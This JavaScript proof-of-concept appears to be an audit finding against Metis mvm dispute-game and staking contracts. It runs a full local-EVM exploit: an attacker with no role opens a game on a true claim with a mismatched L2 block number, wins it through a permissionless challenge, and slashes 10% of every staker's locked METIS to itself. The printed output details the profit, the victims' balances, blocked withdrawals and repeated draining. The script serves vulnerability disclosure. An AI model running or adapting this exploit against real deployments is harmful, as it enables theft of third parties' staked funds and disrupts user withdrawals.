/*
 * PoC - Metis mvm @ 61ef7e9a9a1f404505279e1d86f2c26a885bcc86
 * =====================================================================
 * [H-1] FaultDisputeGame: a dispute game can be opened whose `rootClaim` and its
 *       `l2BlockNumber()` are unrelated, and the special "L2 block number" counter
 *       (challengeRootL2Block, permissionless) instantly wins the game and pays the
 *       WHOLE bond to disputeCreator() -- without any proof of fraud.
 *
 * [H-2] LockingPool.slash(_recipient): on every challenger win, resolve() calls
 *       LockingPool.slash(winner) which takes slashRatio/10000 of EVERY staker's
 *       balance and sends the total to the attacker-chosen `_recipient`.
 *
 * Real contracts, compiled unmodified from packages/contracts (see compile.js):
 *   DisputeGameFactory, FaultDisputeGame, LockingPool, MVM_StateCommitmentChain,
 *   ChainStorageContainer, L1ChugSplashProxy, DelayedWMetis, MetisConfig.
 * Deployment parameters from deploy/10x-*.deploy.ts + deployments/andromeda/*.json.
 *
 * Test doubles (NOT audited): MockERC20 (METIS), MockProxy (ERC1967 host),
 * MockOracle/MockMIPS (Cannon), MockProposerRegistry.
 *
 * One environment shim, marked in the output: this local VM has no ancestor blocks so
 * BLOCKHASH() == 0. `dispute()` stores blockhash(block.number-1) as an anti-duplicate
 * marker (DisputeGameFactory.sol:150) which create() rejects when zero (:184), so the
 * marker is written directly. No business logic is modified.
 */
const { EVM, ethers } = require('./harness');
const e = ethers.parseEther;
const coder = ethers.AbiCoder.defaultAbiCoder();
const fmt = (x) => ethers.formatEther(x) + ' METIS';

const mkHeader = (number) => {
  const hex = number.toString(16);
  return ethers.encodeRlp([
    '0x' + '11'.repeat(32), '0x' + '22'.repeat(32), '0x' + '33'.repeat(20),
    '0x' + '44'.repeat(32), '0x' + '55'.repeat(32), '0x' + '66'.repeat(32),
    '0x' + '77'.repeat(256), '0x',
    '0x' + (hex.length % 2 ? '0' : '') + hex,
    '0x0186a0', '0x', '0x', '0x', '0x', '0x', '0x',
  ]);
};

let A, ATTACKER, KEEPER, PROPOSER, SEQ;

(async () => {
  const evm = new EVM(); await evm.init();
  A = evm.account('deployer');
  ATTACKER = evm.account('attacker');   // holds no role anywhere
  PROPOSER = evm.account('proposer');
  KEEPER = evm.account('keeper');       // the permissioned dispute-game creator (bot)
  SEQ = [evm.account('seq1'), evm.account('seq2'), evm.account('seq3')];
  for (const [n, v] of [['deployer', '100000'], ['attacker', '1000'], ['proposer', '1000'],
                        ['seq1', '500000'], ['seq2', '300000'], ['seq3', '200000'], ['keeper', '0']])
    await evm.setBalance(evm.account(n), e(v));

  // ------------------------------------------------------------ deployment
  console.log('=============== 0. DEPLOYMENT (production parameters) ==============');
  const am = await evm.deploy('Lib_AddressManager', [], A);
  const setAddr = (n, a) => evm.ok(am, A, 'setAddress', [n, a]);
  const metis = await evm.deploy('MockERC20', ['METIS'], A);

  const wmI = await evm.deploy('DelayedWMetis', [86400, metis.address], A);
  const wmP = await evm.deploy('MockProxy', [wmI.address], A);
  const wm = { address: wmP.address, iface: wmI.iface };

  const cfgI = await evm.deploy('MetisConfig', [], A);
  const cfgP = await evm.deploy('MockProxy', [cfgI.address], A);
  const cfg = { address: cfgP.address, iface: cfgI.iface };
  await evm.ok(cfg, A, 'initialize', [A, false]);

  const oracle = await evm.deploy('MockOracle', [86400], A);
  const mips = await evm.deploy('MockMIPS', [oracle.address], A);

  const poolI = await evm.deploy('LockingPool', [], A);
  const poolP = await evm.deploy('MockProxy', [poolI.address], A);
  const pool = { address: poolP.address, iface: poolI.iface };
  await evm.ok(pool, A, 'initialize', [A, metis.address, 604800, 1000, am.address, cfg.address]);
  await evm.ok(wm, A, 'initialize', [A, cfg.address]);       // deploy/103 wiring

  const csc = await evm.deploy('ChainStorageContainer', [am.address, 'StateCommitmentChain'], A);
  const sccI = await evm.deploy('MVM_StateCommitmentChain', [am.address, 604800, 604800], A);
  const chug = await evm.deploy('L1ChugSplashProxy', [A], A);
  const pad = (x) => '0x' + BigInt(x).toString(16).padStart(64, '0');
  const K_IMPL = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
  await evm.ok(chug, A, 'setStorage', [K_IMPL, '0x' + '00'.repeat(12) + sccI.address.slice(2)]);
  await evm.ok(chug, A, 'setStorage', [pad(0), '0x' + '00'.repeat(12) + am.address.slice(2)]);
  await evm.ok(chug, A, 'setStorage', [pad(1), pad(604800)]);
  await evm.ok(chug, A, 'setStorage', [pad(2), pad(604800)]);
  await evm.ok(chug, A, 'setStorage', [pad(3), pad(1088)]);
  const scc = { address: chug.address, iface: sccI.iface };
  const reg = await evm.deploy('MockProposerRegistry', [PROPOSER], A);

  const facI = await evm.deploy('DisputeGameFactory', [metis.address, am.address, 0, 1088], A);
  const facP = await evm.deploy('MockProxy', [facI.address], A);
  const fac = { address: facP.address, iface: facI.iface };
  await evm.ok(fac, A, 'initialize', [A]);
  // GAME_CREATOR_ROLE is granted to the factory owner at initialize (DisputeGameFactory.sol:89);
  // in production it is held by the keeper that materialises every dispute() request.
  await evm.ok(fac, A, 'grantRole',
    [ethers.keccak256(ethers.toUtf8Bytes('GAME_CREATOR')), KEEPER]);

  const fdgI = await evm.deploy('FaultDisputeGame',
    [0, '0x' + '03'.repeat(32), 73, 30, 0, 86400, mips.address, wm.address, am.address, 1088], A);
  await evm.ok(fac, A, 'setImplementation', [0, fdgI.address]);
  await evm.ok(fac, A, 'setInitBond', [0, e('4')]);

  await setAddr('METIS_MANAGER', A);
  await setAddr('DisputeGameFactory', fac.address);
  await setAddr('FaultProofLockingPool', pool.address);
  await setAddr('StateCommitmentChain', scc.address);
  await setAddr('ChainStorageContainer-SCC-batches', csc.address);
  await setAddr('MVM_ProposerRegistry', reg.address);
  await setAddr('DelayedWMetis', wm.address);
  await setAddr('MetisConfig', cfg.address);
  console.log('    game type 0, initBond 4 METIS, slashRatio 1000/10000, lockPeriod 604800');

  // -------------------------------------------------- 1. honest batches
  console.log('\n=============== 1. HONEST PROPOSER PUBLISHES STATE BATCHES ========');
  const BATCH = 100, headers = {};
  let processed = 0;
  const batchOf = async (end) => {
    const roots = [];
    for (let k = 0; k < BATCH; k++)
      roots.push(ethers.keccak256(ethers.toUtf8Bytes('state-' + (end - BATCH + 1 + k))));
    const res = await evm.ok(scc, PROPOSER, 'appendStateBatch',
      [roots, BigInt(processed), ethers.keccak256(mkHeader(end)), end]);
    for (const [addr, topics, data] of (res.execResult.logs || []).filter(l => l.length === 3)) {
      let p; try { p = scc.iface.parseLog({ topics: topics.map(t => ethers.hexlify(t)), data: ethers.hexlify(data) }); } catch (x) { continue; }
      if (p && p.name === 'StateBatchAppended')
        headers[Number(p.args[1])] = { batchIndex: Number(p.args[1]), batchRoot: p.args[2],
          batchSize: Number(p.args[3]), prevTotalElements: Number(p.args[4]),
          extraData: p.args[5], lastL2: end };
    }
    processed += BATCH;
  };
  await batchOf(100);                       // batch 0: L2   1..100
  await evm.mine(604800n + 1000n);          // batch 0 leaves the fraud proof window
  await batchOf(200);                       // batch 1: L2 101..200  (root claim)
  await batchOf(300);                       // batch 2: L2 201..300  (l2BlockNumber source)
  console.log('    batch 0 finalized; batches 1..2 still inside the fraud proof window');
  const [lf, ed] = await evm.view(scc, A, 'findEarliestDisputableBatch', [1088]);
  console.log('    lastFinalized ends at L2', lf[1].toString(),
              '| earliestDisputable ends at L2', ed[1].toString());

  // ------------------------------------------- 2. third-party staker funds
  console.log('\n=============== 2. THREE SEQUENCERS LOCK THEIR METIS ==============');
  let i = 0;
  for (const amt of [e('500000'), e('300000'), e('200000')]) {
    await evm.ok(metis, SEQ[i], 'mint', [SEQ[i], amt]);
    await evm.ok(metis, SEQ[i], 'approve', [pool.address, amt]);
    await evm.ok(pool, SEQ[i], 'deposit', [amt]);
    i++;
  }
  const totalLocked0 = (await evm.view(pool, A, 'totalLocked'))[0];
  const ratio = (await evm.view(pool, A, 'slashRatio'))[0];
  console.log('    totalLocked =', fmt(totalLocked0),
              '| METIS in pool =', fmt((await evm.view(metis, A, 'balanceOf', [pool.address]))[0]));
  console.log('    slashRatio  =', ratio.toString(), '/10000');

  // --------------------------- 3. STEP A: game with mismatched block number
  console.log('\n=============== 3. STEP A - OPEN A GAME ON A TRUE CLAIM ============');
  const claimedBlock = 250;                                   // lives in batch 2
  const extraData = coder.encode(['uint256'], [claimedBlock]);
  // the claim is the genuine, already-committed batch 1 header hash
  const rootClaim = (await evm.view(csc, A, 'getByChainId', [1088, 1]))[0];
  console.log('    rootClaim          = hash of the batch 1 header (valid state root)');
  console.log('    l2BlockNumber()    =', claimedBlock, '- a block of batch 2');
  console.log('    nothing on-chain ties the root claim to the batch named in extraData');
  await evm.ok(metis, ATTACKER, 'mint', [ATTACKER, e('100')]);
  await evm.ok(metis, ATTACKER, 'approve', [fac.address, e('4')]);
  await evm.ok(fac, ATTACKER, 'dispute', [0, extraData, 2]);   // batch 2 contains 250
  console.log('    dispute() ok: public entry point, 4 METIS bond escrowed');

  const marker = ethers.keccak256(ethers.toUtf8Bytes('l1-block-' + evm._block.header.number));
  const uuid = ethers.keccak256(ethers.solidityPacked(['uint32', 'bytes'], [0, extraData]));
  const base = BigInt(ethers.keccak256(coder.encode(['bytes32', 'uint256'], [uuid, 155n])));
  await evm.setStorage(fac.address, '0x' + (base + 2n).toString(16).padStart(64, '0'), marker);
  console.log('    [harness shim] anti-duplicate marker l1Head written (dev chain: no BLOCKHASH)');

  // the keeper fulfils the public request; this is the documented two-step flow
  const rc = await evm.ok(fac, KEEPER, 'create', [0, rootClaim, extraData]);
  const gameAddr = ethers.getAddress('0x' + Buffer.from(rc.execResult.returnValue).toString('hex').slice(-40));
  const game = { address: gameAddr, iface: fdgI.iface };
  console.log('    game at', gameAddr, '| startingBlockNumber() =',
              (await evm.view(game, A, 'startingBlockNumber'))[0].toString());
  console.log('    initialize() accepted the mismatched pair; the claim itself is CORRECT');

  // ------------------- 4. STEP B: permissionless "L2 block number" challenge
  console.log('\n=============== 4. STEP B - challengeRootL2Block() (PERMISSIONLESS) ===');
  const hdr = headers[1];
  const outProof = { batchIndex: hdr.batchIndex, batchRoot: hdr.batchRoot,
    batchSize: hdr.batchSize, prevTotalElements: hdr.prevTotalElements, extraData: hdr.extraData };
  const recomputed = ethers.keccak256(coder.encode(['bytes32', 'uint256', 'uint256', 'bytes'],
    [outProof.batchRoot, outProof.batchSize, outProof.prevTotalElements, outProof.extraData]));
  console.log('    batch root from the on-chain chain storage =', outProof.batchRoot.slice(0, 18) + '...');
  console.log('    Lib_OVMCodec.hashBatchHeader(proof) == rootClaim ?', recomputed === rootClaim);
  const realHeader = mkHeader(hdr.lastL2);       // the REAL header of block 200
  console.log('    submitted header is the genuine header of L2 block', hdr.lastL2,
              '!= l2BlockNumber()', claimedBlock);
  await evm.ok(game, ATTACKER, 'challengeRootL2Block', [outProof, realHeader]);
  console.log('    ACCEPTED. Nothing was disproved: the root claim is the true state root.');
  console.log('    l2BlockNumberChallenged =', (await evm.view(game, A, 'l2BlockNumberChallenged'))[0]);
  console.log('    l2BlockNumberChallenger =', (await evm.view(game, A, 'l2BlockNumberChallenger'))[0]);

  // ------------------------------------------ 5. STEP C: resolve the game
  console.log('\n=============== 5. STEP C - RESOLVE (ANYONE CAN CALL THESE) ========');
  await evm.mine(86401n);
  await evm.ok(game, A, 'resolveClaim', [0, 0]);
  console.log('    claimData[0].counteredBy =', (await evm.view(game, A, 'claimData', [0]))[1]);
  await evm.ok(game, A, 'resolve');
  console.log('    status =', (await evm.view(game, A, 'status'))[0].toString(),
              '(1 = CHALLENGER_WINS against a TRUE claim)');
  console.log('    credit[attacker] =', fmt((await evm.view(game, A, 'credit', [ATTACKER]))[0]));

  // ---------------------------------------------- 6. STEP D: take the money
  console.log('\n=============== 6. STEP D - COLLECT ================================');
  const a0 = (await evm.view(metis, A, 'balanceOf', [ATTACKER]))[0];
  console.log('    attacker METIS right after resolve() =', fmt(a0));
  await evm.mine(86401n);                       // DelayedWMetis withdrawal delay
  await evm.ok(game, ATTACKER, 'claimCredit', [ATTACKER]);
  const a1 = (await evm.view(metis, A, 'balanceOf', [ATTACKER]))[0];
  console.log('    claimCredit() -> +', fmt(a1 - a0), '(the 4 METIS bond)');
  const totalLocked1 = (await evm.view(pool, A, 'totalLocked'))[0];
  console.log('    resolve() already ran LockingPool.slash(attacker):');
  console.log('      totalLocked', fmt(totalLocked0), '->', fmt(totalLocked1));
  console.log('      attacker balanceOf inside the pool =',
              fmt((await evm.view(pool, A, 'balanceOf', [ATTACKER]))[0]));
  const a3 = (await evm.view(metis, A, 'balanceOf', [ATTACKER]))[0];
  console.log('    final attacker METIS balance =', fmt(a3),
              '(slash() transfers immediately, no unlock period)');

  const bond = e('4');
  console.log('\n======================= RESULT =======================');
  console.log(' attacker paid (init bond)     :', fmt(bond));
  console.log(' attacker received             :', fmt(a3));
  console.log(' attacker NET PnL              :', fmt(a3 - bond));
  console.log(' METIS removed from stakers    :', fmt(totalLocked0 - totalLocked1),
              '(' + ((totalLocked0 - totalLocked1) * 10000n / totalLocked0).toString(), 'bps)');
  console.log(' remaining totalLocked         :', fmt((await evm.view(pool, A, 'totalLocked'))[0]));
  console.log(' METIS actually left in pool   :', fmt((await evm.view(metis, A, 'balanceOf', [pool.address]))[0]));
  console.log(' victims:');
  let j = 0;
  for (const w of SEQ) {
    console.log('   ', w.slice(0, 10) + '...', 'was owed', fmt([e('500000'), e('300000'), e('200000')][j]),
      '-> accounted', fmt((await evm.view(pool, A, 'balanceOf', [w]))[0]));
    j++;
  }
  console.log('======================================================');
  const net = a3 - bond;
  console.log(net > 0n ? '>>> PROFITABLE: 4 METIS risked, ' + fmt(net) + ' of third-party funds taken'
                       : '>>> not profitable');

  // ------------------------------------------------ 7. side effects
  console.log('\n=============== 7. SIDE EFFECTS ====================================');
  console.log('    SCC.disputedBatches[rootClaim] =',
              (await evm.view(scc, A, 'disputedBatches', [rootClaim]))[0]);
  console.log('    SCC.earliestDisputedBlockNumber =',
              (await evm.view(scc, A, 'earliestDisputedBlockNumber'))[0].toString());
  console.log('    -> L1CrossDomainMessenger._verifyStateRootProofByChainId requires');
  console.log('       prevTotalElements + batchSize < earliestDisputedBlockNumber (:484-486),');
  console.log('       so every L2->L1 withdrawal proven against a batch that ends at or');
  console.log('       after L2', (await evm.view(scc, A, 'earliestDisputedBlockNumber'))[0].toString(),
              'is now rejected.');

  // ---------------------------------------- 8. repeatability (bounded by fees)
  console.log('\n=============== 8. REPEATABILITY ===================================');
  console.log('    every further game needs its own `dispute()`+`create()` request, and');
  console.log('    dispute() requires batchTimes[batch][1] > now - FRAUD_PROOF_WINDOW');
  console.log('    + DISPUTE_TIMEOUT_PERIOD (DisputeGameFactory.sol:128-132). With the');
  console.log('    production FRAUD_PROOF_WINDOW of 7 days this means at most one extra');
  console.log('    drain per (batch, block-number) pair that is still inside the window:');
  const repeat = totalLocked0 * ratio / 10000n;
  console.log('      drain k+1 = 10% of (1 - 0.1*k) x totalLocked  ->',
              fmt(repeat), 'then', fmt((totalLocked0 - repeat) * ratio / 10000n),
              'then', fmt((totalLocked0 - repeat - (totalLocked0 - repeat) * ratio / 10000n) * ratio / 10000n));
  console.log('    Each game is a 4 METIS bond against a', fmt(repeat), 'payout, so it is');
  console.log('    profitable until fewer than 40 METIS remain in the pool.');
})().catch(err => { console.error('\nFAILED:', err.message); process.exit(1); });
